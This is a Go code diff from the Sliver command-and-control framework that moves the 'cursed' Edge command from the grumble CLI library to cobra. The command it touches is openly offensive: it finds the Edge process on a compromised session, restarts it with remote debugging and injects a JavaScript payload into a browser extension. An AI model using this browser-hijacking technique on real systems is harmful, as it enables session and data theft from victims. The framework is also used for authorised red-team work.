@@ -20,38 +20,40 @@ package cursed
 
 import (
 	"context"
-	"io/ioutil"
+	"os"
+
 	"strings"
 
 	"github.com/AlecAivazis/survey/v2"
+	"github.com/spf13/cobra"
+
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/client/overlord"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/desertbit/grumble"
 )
 
 // CursedChromeCmd - Execute a .NET assembly in-memory
-func CursedEdgeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
+func CursedEdgeCmd(cmd *cobra.Command, con *console.SliverConsoleClient, args []string) {
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
 
-	payloadPath := ctx.Flags.String("payload")
+	payloadPath, _ := cmd.Flags().GetString("payload")
 	var payload []byte
 	var err error
 	if payloadPath != "" {
-		payload, err = ioutil.ReadFile(payloadPath)
+		payload, err = os.ReadFile(payloadPath)
 		if err != nil {
 			con.PrintErrorf("Could not read payload file: %s\n", err)
 			return
 		}
 	}
 
-	curse := avadaKedavraEdge(session, ctx, con)
+	curse := avadaKedavraEdge(session, cmd, con, args)
 	if curse == nil {
 		return
 	}
@@ -79,10 +81,10 @@ func CursedEdgeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		con.Printf("success!\n")
 		con.PrintInfof("Found viable Edge extension %s%s%s (%s)\n", console.Bold, chromeExt.Title, console.Normal, chromeExt.ID)
 		con.PrintInfof("Injecting payload ... ")
-		ctx, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
-		// extCtxTimeout, cancel := context.WithTimeout(ctx, 10*time.Second)
+		cmd, _, _ := overlord.GetChromeContext(chromeExt.WebSocketDebuggerURL, curse)
+		// extCtxTimeout, cancel := context.WithTimeout(cmd, 10*time.Second)
 		// defer cancel()
-		_, err = overlord.ExecuteJS(ctx, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
+		_, err = overlord.ExecuteJS(cmd, chromeExt.WebSocketDebuggerURL, chromeExt.ID, string(payload))
 		if err != nil {
 			con.PrintErrorf("%s\n", err)
 			return
@@ -94,8 +96,8 @@ func CursedEdgeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	}
 }
 
-func avadaKedavraEdge(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) *core.CursedProcess {
-	edgeProcess, err := getEdgeProcess(session, ctx, con)
+func avadaKedavraEdge(session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient, cargs []string) *core.CursedProcess {
+	edgeProcess, err := getEdgeProcess(session, cmd, con)
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return nil
@@ -116,7 +118,7 @@ func avadaKedavraEdge(session *clientpb.Session, ctx *grumble.Context, con *cons
 			return nil
 		}
 		terminateResp, err := con.Rpc.Terminate(context.Background(), &sliverpb.TerminateReq{
-			Request: con.ActiveTarget.Request(ctx),
+			Request: con.ActiveTarget.Request(cmd),
 			Pid:     edgeProcess.GetPid(),
 		})
 		if err != nil {
@@ -128,7 +130,7 @@ func avadaKedavraEdge(session *clientpb.Session, ctx *grumble.Context, con *cons
 			return nil
 		}
 	}
-	curse, err := startCursedChromeProcess(true, session, ctx, con)
+	curse, err := startCursedChromeProcess(true, session, cmd, con, cargs)
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return nil
@@ -137,7 +139,7 @@ func avadaKedavraEdge(session *clientpb.Session, ctx *grumble.Context, con *cons
 }
 
 func isEdgeProcess(executable string) bool {
-	var edgeProcessNames = []string{
+	edgeProcessNames := []string{
 		"msedge",         // Linux
 		"microsoft-edge", // Linux
 		"msedge.exe",     // Windows
@@ -151,9 +153,9 @@ func isEdgeProcess(executable string) bool {
 	return false
 }
 
-func getEdgeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*commonpb.Process, error) {
+func getEdgeProcess(session *clientpb.Session, cmd *cobra.Command, con *console.SliverConsoleClient) (*commonpb.Process, error) {
 	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
-		Request: con.ActiveTarget.Request(ctx),
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	if err != nil {
 		return nil, err
